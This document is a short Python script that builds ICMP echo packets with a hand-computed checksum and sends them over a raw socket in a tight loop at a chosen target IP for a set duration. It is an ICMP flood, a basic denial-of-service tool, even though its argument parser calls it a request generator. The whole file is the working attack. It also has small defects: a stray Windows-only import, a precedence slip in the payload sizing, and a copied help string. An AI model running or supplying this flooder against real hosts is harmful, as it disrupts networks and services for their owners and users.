from ctypes.wintypes import tagRECT
import socket
import struct
import sys
import time
import argparse


def icmp_flood(target_ip, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    timeout = time.time() + duration
    while time.time() < timeout:
        packet = create_icmp_packet(packet_size)
        sock.sendto(packet, (target_ip, 0))


def create_icmp_packet(packet_size):
    header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
    #data = b'ABCDEFGHIJKLMNOPQRSTUVWX'[:packet_size]
    data = (b'ABCDEFGHIJKLMNOPQRSTUVWX' * (packet_size-7 // 24 + 1))[:packet_size-7]
    cksum = calculate_checksum(header + data)
    header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
    return header + data

def calculate_checksum(data):
    checksum = 0
    countTo = (len(data) // 2) * 2

    for count in range(0, countTo, 2):
        thisVal = data[count+1] * 256 + data[count]
        checksum = checksum + thisVal
        checksum = checksum & 0xffffffff

    if countTo < len(data):
        checksum = checksum + data[countTo]
        checksum = checksum & 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    checksum = ~checksum
    checksum = checksum & 0xffff
    checksum = checksum >> 8 | (checksum << 8 & 0xff00)

    return checksum

if __name__ == '__main__':
    #if len(sys.argv) < 4:
    #    print("Usage: python filename.py target_ip duration packet_size")
    #    sys.exit(1)

    #target_ip = sys.argv[1]
    #duration = int(sys.argv[2])
    #packet_size = int(sys.argv[3])
    
    parser = argparse.ArgumentParser(description="ICMP Request Generator")
    parser.add_argument("-target", type=str, help="Target IP address")
    parser.add_argument("-duration", type=int, default=1, help="Timeout in seconds (default: 1)")
    parser.add_argument("-size", type=int, default=64, help="Timeout in seconds (default: 1)")

    args = parser.parse_args()

    target_ip = args.target
    duration = args.duration
    packet_size = args.size

    icmp_flood(target_ip, duration, packet_size)